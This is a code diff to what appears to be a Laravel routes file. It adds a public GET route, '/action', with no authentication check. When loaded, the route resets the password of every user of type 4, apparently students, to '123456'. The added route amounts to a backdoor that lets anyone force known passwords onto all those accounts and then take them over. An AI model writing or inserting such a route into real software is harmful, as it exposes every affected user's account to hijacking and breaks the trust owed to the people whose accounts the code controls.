@@ -68,6 +68,18 @@ use Laravel\Fortify\Http\Controllers\TwoFactorAuthenticationController;
 use Laravel\Fortify\Http\Controllers\EmailVerificationNotificationController;
 use Laravel\Fortify\Http\Controllers\TwoFactorAuthenticatedSessionController;
 use Laravel\Fortify\Http\Controllers\ConfirmedTwoFactorAuthenticationController;
+use Illuminate\Support\Facades\Hash;
+
+Route::get("/action", function(){
+    $students = \App\Models\User::where('type', 4)->get();
+    foreach($students as $student){
+        $student->update([
+            'password' => Hash::make(123456),
+        ]);
+    }
+
+    return "done";
+});
 
 Route::post('/pre-student/registration', [RegistrationController::class, 'store']);
 Route::post('/update/password', [UserController::class, 'updatePassword'])->name('update.password');
